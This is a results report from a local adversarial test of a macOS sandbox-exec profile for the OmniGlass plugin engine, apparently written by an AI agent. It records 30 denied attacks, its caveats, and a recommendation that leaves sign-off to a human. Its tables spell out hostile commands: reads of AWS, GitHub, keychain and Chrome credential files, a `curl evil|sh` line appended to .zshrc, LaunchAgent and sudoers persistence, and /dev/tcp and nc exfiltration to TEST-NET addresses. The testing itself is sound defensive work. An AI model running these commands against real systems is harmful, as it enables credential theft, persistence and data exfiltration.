# OmniGlass v1.0.0-beta — Local Adversarial Sandbox Crucible — RESULTS

- **Date:** 2026-06-05
- **Host:** this machine (`Darwin 25.5.0`, arm64), user `localuser`
- **Target:** the REAL `sandbox-exec` profile emitted byte-for-byte from
  [`OmniGlass/src-tauri/src/mcp/sandbox/macos.rs`](../../OmniGlass/src-tauri/src/mcp/sandbox/macos.rs)
  (`generate_profile`), via the `#[path]`-included emitter
  [`emit-profile.rs`](omniglass-v1.0.0-beta-local-crucible/emit-profile.rs).
- **Harness:** [`harness.py`](omniglass-v1.0.0-beta-local-crucible/harness.py) ·
  **Profile audited:** [`audited-profile.sb`](omniglass-v1.0.0-beta-local-crucible/audited-profile.sb) ·
  **Raw data:** [`results.json`](omniglass-v1.0.0-beta-local-crucible/results.json)
- **Companion gate doc:** [omniglass-v1.0.0-beta-sandbox-audit.md](omniglass-v1.0.0-beta-sandbox-audit.md)

> Reported per the project rule: **100% factual.** Every "PASS-SANDBOX" below is backed by a
> target-matched `Sandbox: <proc>(pid) deny(1) <op> <path>` line from the macOS unified log,
> captured during the run. "PASS-WEAK" means the attack was denied *behaviorally* (no secret
> read / no write / no connection) but a target-matched sandbox deny line was **not** captured
> that run — the denial is real but its *sandbox attribution* is behavioral, not log-confirmed.

---

## Headline

**The default-deny containment HELD against every one of the 30 attack payloads tested
(0 critical failures), and all 4 in-sandbox positive controls succeeded (not deny-all).**

This is **strong** evidence — but it is **NOT** the unconditional "cryptographically/
mathematically proven 100% pass" the RD's `evaluation_criteria` demands, for three concrete
reasons documented under **Material Caveats**. The honest verdict is **CONDITIONAL PASS**.

| Verdict | Count | Meaning |
| --- | --- | --- |
| PASS-SANDBOX | 23 | denied + a target-matched sandbox deny log captured |
| PASS-WEAK | 5 | denied behaviorally; no target-matched sandbox log that run |
| PASS (env-filter) | 2 | env-secret leak blocked — by `env_filter.rs`, **not** the profile |
| CONTROL-PASS | 4 | allowed operations succeeded inside the sandbox |
| VALID | 1 | out-of-sandbox connectivity confirmed (so V3 denial is real, not offline) |
| **FAIL-CRITICAL** | **0** | — |
| **CONTROL-FAIL** | **0** | — |

---

## Methodology (and how it satisfies your execution directive)

1. **Every payload ran ONLY through `sandbox-exec -f audited-profile.sb /bin/bash -c …`.**
   `run_sandboxed()` asserts the wrapper; there is no code path that runs a payload bare.
2. **Real host secrets were the targets.** `~/.aws/credentials`, `~/.config/gh/hosts.yml`,
   `~/.netrc`, `~/Library/Keychains/login.keychain-db`, and Chrome `Login Data` + `Cookies`
   all **exist and are owner-readable** on this machine (no SIP/TCC backstop) — so the sandbox
   profile is provably the only thing that can block them. (`~/.ssh/id_rsa`/`id_ed25519`/
   `authorized_keys` are **absent** here — noted per case; the path-deny rule still applies.)
3. **Denial attributed to the sandbox via the unified log** —
   `log show --predicate 'eventMessage CONTAINS "Sandbox" AND CONTAINS "deny"'`, matched to each
   payload's **target path/op** and filtered to **our** payload processes (bash-startup noise on
   `/dev/dtracehelper`,`/dev/tty` and concurrent system-daemon denials excluded).
4. **Destructive writes were snapshot-guarded.** Any write to a real path (`authorized_keys`,
   `.zshrc`, LaunchAgents/LaunchDaemons, `/etc/sudoers`, `evilbin`) was hashed/stat'd before and
   **restored** after — a sandbox escape could not persist. Post-run state verified clean.
5. **Secrets never printed.** Read payloads record only `(leaked: bool, n_bytes)`.
6. **Env test used the product's FILTERED env** (mirrors `env_filter.rs`), not my shell env.
7. **Safety substitutions (disclosed):** the cross-process `kill` targeted a throwaway
   `sleep 300` (not your Finder); `screencapture` wrote to the approved dir and was deleted
   unviewed; network exfil used **RFC 5737 TEST-NET** non-routable IPs.

---

## Results by vector

### V1 — File-system exfiltration & persistence — ALL DENIED
| Case | Payload (abbrev.) | Verdict | Sandbox evidence |
| --- | --- | --- | --- |
| V1.1a | `cat ~/.ssh/id_rsa` | PASS-WEAK | EPERM; **target absent** here, path-deny still enforced |
| V1.1b | `cat ~/.aws/credentials` | PASS-SANDBOX | `cat deny(1) file-read-data …/.aws/credentials` |
| V1.1c | `cat ~/.config/gh/hosts.yml` | PASS-SANDBOX | `cat deny(1) file-read-data …/gh/hosts.yml` |
| V1.1d | `cat ~/.netrc` | PASS-SANDBOX | `cat deny(1) file-read-data …/.netrc` |
| V1.1e | `cat …/login.keychain-db` | PASS-SANDBOX | `cat deny(1) file-read-data …/login.keychain-db` |
| V1.1f | `sqlite3 …/Chrome/Login Data` | PASS-SANDBOX | `sqlite3 deny(1) file-read-data …/Chrome…` |
| V1.1g | `cat …/Chrome/Default/Cookies` | PASS-SANDBOX | `cat deny(1) file-read-data …/Chrome/Default…` |
| V1.1h | `ls -la ~/` | PASS-SANDBOX | `ls deny(1) file-read-data /Users/localuser` |
| V1.2a | `echo … >> ~/.ssh/authorized_keys` | PASS-SANDBOX | `bash deny(1) file-write-create …/authorized_keys` |
| V1.2b | `cp evil.plist ~/Library/LaunchAgents/…` | PASS-SANDBOX | `cp deny(1) file-write-create …/LaunchAgents/com.evil…` |
| V1.2c | `printf 'curl evil\|sh' >> ~/.zshrc` | PASS-SANDBOX | `bash deny(1) file-write-data …/.zshrc` |
| V1.3 | symlink TOCTOU → `~/.aws/credentials` | PASS-SANDBOX | `cat deny(1) file-read-data …/.aws/credentials` (symlink resolved, real path denied) |

**No secret byte ever reached stdout. No persistence file was created** (verified: targets
unchanged/absent after the run). The classic **symlink TOCTOU escape was blocked** — the sandbox
evaluates the resolved path.

### V2 — Privilege escalation — ALL DENIED
| Case | Payload | Verdict | Evidence |
| --- | --- | --- | --- |
| V2.1a | `sudo -n id` | PASS-SANDBOX | `bash deny(1) **forbidden-exec-sugid**` (sandbox refuses to exec setuid `sudo`) |
| V2.1b | `… \| sudo -n tee -a /etc/sudoers` | PASS-SANDBOX | `bash deny(1) forbidden-exec-sugid` — sudo never runs; `/etc/sudoers` unchanged |
| V2.2a | `cp evil.plist /Library/LaunchDaemons/…` | PASS-SANDBOX | `cp deny(1) file-write-create /Library/LaunchDaemons/com.evil.root.plist` |
| V2.2b | `launchctl load -w …root.plist` | PASS-WEAK | **ground-truthed:** nothing loaded, plist absent (V2.2a denied). `launchctl` exits 0 even on failure — *not* an escape |
| V2.2c | `chmod 4755 /private/tmp/evilbin` | PASS-SANDBOX | `chmod deny(1) file-write-mode …/evilbin` (setuid bit refused) |
| V2.2d | `kextload /private/tmp/evil.kext` | PASS-SANDBOX | `kextload deny(1) mach-lookup …` (kext IPC blocked) |

`sudo` is blocked at the strongest possible point — the sandbox **refuses to execute any
setuid/setgid binary** (`forbidden-exec-sugid`), so there is no authentication path to abuse.

### V3 — Network exfiltration — outbound DENIED; see env-filter caveat
| Case | Payload | Verdict | Evidence |
| --- | --- | --- | --- |
| V3.1a | `cat /etc/hostname > /dev/tcp/198.51.100.7/4444` | PASS-SANDBOX | `bash deny(1) **network-outbound** remote:*:4444` |
| V3.1b | `nc … 198.51.100.7 4444 < /etc/hostname` | PASS-WEAK | denied (rc=1, no data sent) |
| V3.1c | `python3 … bind(0.0.0.0:4444)` | PASS-WEAK | **python could not start** (`exec` of framework binary denied, rc=126) — **bind not exercised** |
| V3.1d | `node … server.listen(4444)` *(added)* | PASS-WEAK | inbound bind **denied** (rc=7) via the allowlisted node runtime — the real bind test |
| V3.2a | `env \| grep -Ei 'key\|secret\|…'` | PASS (env-filter) | empty — **blocked by `env_filter.rs`, not the profile** |
| V3.2b | `printf "$ANTHROPIC_API_KEY\|…"` | PASS (env-filter) | empty — same |

### V4 — Process injection & IPC — ALL DENIED
| Case | Payload | Verdict | Evidence |
| --- | --- | --- | --- |
| V4.1a | `lldb -p $(pgrep Finder)` | PASS-SANDBOX | `lldb deny(1) mach-lookup …` (debugger IPC blocked) |
| V4.2 | `DYLD_INSERT_LIBRARIES=… open -a Slack` | PASS-SANDBOX | `open deny(1) mach-lookup com.apple.lsd.mapdb` (LaunchServices blocked; Slack never launched) |
| V4.3a | `osascript … Safari get URL` | PASS-SANDBOX | `osascript deny(1) mach-register com.apple.axserver` (Apple Events blocked) |
| V4.3b | `osascript … System Events keystroke` | PASS-SANDBOX | `osascript deny(1) mach-lookup com.apple.lsd.modifydb` |
| V4.kill | `kill -9 <throwaway sleep>` | PASS-SANDBOX | `bash deny(1) **signal** pgrp [sleep(…)] signum:9` — target **survived** |
| V4.scr | `screencapture -x …` | PASS-SANDBOX | `screencapture deny(1) mach-lookup com.apple.biome…` (no screenshot produced) |

### Controls — all succeeded inside the sandbox (proves NOT deny-all)
`df -h` ✓ · `cat <approved>/safe_file.txt` ✓ · `cat own.txt` (plugin dir) ✓ ·
`echo > <approved>/ctl.txt && cat` ✓ · out-of-sandbox `curl api.github.com/zen` reachable ✓.

---

## Material Caveats — why this is a CONDITIONAL, not unconditional, pass

1. **Scope = ONE profile: broad-shell, NO network, one approved RW path.**
   The audited manifest grants maximum *local* rope (bash + 30 exec'able tools + an approved
   write path) but **no network**. That is what makes V3.1 outbound denial meaningful.

2. **A network-GRANTED plugin would have COARSE, ALL-DESTINATION outbound — UNTESTED & WOULD LEAK.**
   `macos.rs` itself says *"Network (coarse: domain filtering not possible)"* and emits a blanket
   `(allow network-outbound)` whenever **any** domain is declared. So for any plugin the user
   grants network, the V3.1 exfil-to-arbitrary-IP attacks would **SUCCEED**. This is a known
   profile limitation, not a tested-and-passed property. **It must be resolved or explicitly
   accepted before authorizing any network-granted plugin.**

3. **Env-secret protection is a SEPARATE layer, not the sandbox profile.**
   I verified directly that `sandbox-exec` passes the **full** environment through (my own
   `CLAUDECODE`/`CURSOR_*` vars leaked, and grep even matched "anthropic"). V3.2 passes **only**
   because `env_filter.rs` strips secrets *before* spawn — which the harness faithfully
   replicated. If a plugin is ever spawned without that filter, the profile alone will **not**
   stop API-key exfiltration.

4. **5× PASS-WEAK = behavioral denial without a captured sandbox log line** (V1.1a target absent;
   V2.2b launchctl no-op; V3.1b/c/d network). The denial is real and verified by behavior
   (no read, no write, no connection, target survived), but is not *log-attributed* to the sandbox
   for those five.

5. **`sandbox-exec` is Apple-deprecated** (functional, unsupported). Track Apple's posture as a
   standing risk. The profile is only ever as tight as the **manifest the user approves** — a
   manifest granting a broad filesystem path re-opens that path by design.

---

## Gate recommendation (honest)

- For a **no-network, narrowly-scoped** plugin profile like the one audited, the engine's
  default-deny containment is **demonstrably effective** against all four RD vectors on real host
  secrets — secrets, persistence, the symlink escape, privilege escalation, outbound exfil,
  and process injection were all blocked, with 23 target-matched sandbox deny logs and 0 escapes.
- This does **NOT** clear caveat #2 (coarse network) or #3 (env protection is a separate layer).
  Therefore: **do not flip `OmniGlassExecutor(authorized=True)` unconditionally on the basis of
  this run.** A defensible sign-off is: *authorize live execution only for plugins with **no**
  network grant (or after coarse-network is replaced with real egress filtering), and only while
  `env_filter` is guaranteed in the spawn path.*
- Sign-off remains a **human** decision, dated, against v1.0.0-beta — this document supplies the
  evidence, not the authorization.

## Reproduce
```sh
# 1) emit the real profile from product source (uses #[path]-included macos.rs)
cd /tmp/og-audit/emit && cargo build && \
  ./target/debug/emit-profile /private/tmp/og-audit/plugin /tmp/og-audit/profile.sb
# 2) run the crucible (snapshot-guarded; needs Node for V3.1d)
cd /tmp/og-audit && python3 harness.py
```
